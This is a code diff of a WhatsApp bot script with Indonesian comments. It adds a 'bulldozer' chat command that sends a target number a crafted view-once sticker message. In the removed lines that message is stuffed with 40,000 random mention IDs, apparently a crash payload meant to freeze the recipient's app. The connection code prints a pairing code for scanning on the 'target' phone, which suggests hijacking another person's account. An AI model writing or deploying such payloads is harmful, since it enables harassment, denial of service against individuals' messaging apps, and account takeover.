@@ -16,8 +16,6 @@ let lastLog = "-"
 let lastCPU = 0
 let reconnecting = false
 global.sock = null
-
-// Pairing number — akan terisi lewat menu
 global.pairingNumber = null
 
 // STATUS PANEL
@@ -172,48 +170,45 @@ function restartBot() {
     startBot()
 }
 
-// ───────── START BOT ─────────
+// ───────── BULLDOZER FUNCTION ─────────
 async function bulldozer(target) {
-  const to = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net"
+    const to = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net"
 
-  let message = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
-          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-          mimetype: "image/webp",
-          directPath:
-            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-          fileLength: { low: 1, high: 0, unsigned: true },
-          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: true,
-          contextInfo: {
-            mentionedJid: [
-              "0@s.whatsapp.net",
-              ...Array.from({ length: 40000 }, () =>
-                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
-              ),
-            ],
-            groupMentions: [],
-          },
+    let message = {
+        viewOnceMessage: {
+            message: {
+                stickerMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+                    mimetype: "image/webp",
+                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+                    fileLength: { low: 1, high: 0, unsigned: true },
+                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+                    firstFrameLength: 19904,
+                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
+                    isAnimated: true,
+                    contextInfo: {
+                        mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 10 }, () =>
+                            "1" + Math.floor(Math.random() * 5000) + "@s.whatsapp.net"
+                        )],
+                        groupMentions: [],
+                    },
+                },
+            },
         },
-      },
-    },
-  };
+    }
 
-  try {
-    await sock.sendMessage(to, message)
-    console.log("Bulldozer terkirim ke", target)
-  } catch (e) {
-    console.log("Gagal kirim bulldozer:", e.message)
-  }
+    try {
+        await sock.sendMessage(to, message)
+        console.log(green("Bulldozer terkirim ke"), target)
+    } catch (e) {
+        console.log(red("Gagal kirim bulldozer:"), e.message)
+    }
 }
 
+// ───────── START BOT ─────────
 async function startBot() {
     try {
         if (checkAuthIntegrity()) {
@@ -245,18 +240,18 @@ async function startBot() {
         sock.ev.on("connection.update", async (update) => {
             const { qr, connection, lastDisconnect } = update
 
-            // Saat ada event QR + mulai konek
-            if ((!!qr || connection === "connecting") && global.pairingNumber) {
+            // Pairing sekali saat connecting
+            if (connection === "connecting" && global.pairingNumber) {
                 try {
                     const pairingCode = await sock.requestPairingCode(global.pairingNumber)
-                    console.log(green(`\n→ Pairing code untuk ${global.pairingNumber}:`), pairingCode)
+                    console.log(green(`→ Pairing code untuk ${global.pairingNumber}:`), pairingCode)
                     console.log(yellow("→ Silakan scan di HP target dalam 60 detik.\n"))
                 } catch (e) {
                     console.log(red("→ Gagal generate pairing code:"), e.message)
                 }
             }
 
-            // Normal QR output
+            // QR
             if (qr) {
                 global.lastQR = qr
                 global.currentStatus = "Scan QR!"
@@ -297,48 +292,44 @@ async function startBot() {
 
         sock.ev.on("creds.update", saveCreds)
 
-// MESSAGES.UPSET HANDLER
+        // ───────── MESSAGES.UPSET HANDLER ─────────
         sock.ev.on("messages.upsert", async ({ messages }) => {
             let msg = messages[0]
-           if (!msg.message) return // abaikan pesan kosong
-           if (!msg.key.fromMe) msgCount++ // hitung pesan masuk
+            if (!msg.message) return
+            if (!msg.key.fromMe) msgCount++
 
             let from = msg.key.remoteJid
-            let text =
-               msg.message.conversation ||
-               msg.message.extendedTextMessage?.text ||
-                ""
+            let text = msg.message.conversation || msg.message.extendedTextMessage?.text || ""
 
             lastLog = `${from} → ${text}`
-           panel() // refresh panel
+            panel()
 
-           // ===== COMMAND PARSING =====
-           const args = text.trim().split(" ")
+            const args = text.trim().split(" ")
             const command = args[0].toLowerCase()
 
-    // ----- COMMAND: BULLDOZER -----
-           if (command === "bulldozer") {
-               const target = args[1] // nomor tujuan
-               if (!target) {
-                   await sock.sendMessage(from, { text: "Nomor tujuan tidak valid!" })
+            // ----- COMMAND: BULLDOZER -----
+            if (command === "bulldozer") {
+                const target = args[1]
+                if (!target) {
+                    await sock.sendMessage(from, { text: "Nomor tujuan tidak valid!" })
                     return
                 }
-               await bulldozer(target) // panggil fungsi bulldozer
+                await bulldozer(target)
                 await sock.sendMessage(from, { text: `Bulldozer dikirim ke ${target}` })
                 return
-           }
+            }
 
-    // ----- COMMAND: PING -----
+            // ----- COMMAND: PING -----
             if (command === "ping") {
                 let t = Date.now()
                 await sock.sendMessage(from, { text: "pong!" })
-               let ping = Date.now() - t
+                let ping = Date.now() - t
                 panel(ping + " ms")
                 return
             }
 
-    // ----- COMMAND LAIN BISA DITAMBAH DI SINI -----
-})
+            // ----- COMMAND LAIN BISA DITAMBAH DI SINI -----
+        })
 
         process.on("uncaughtException", (err) => {
             errCount++
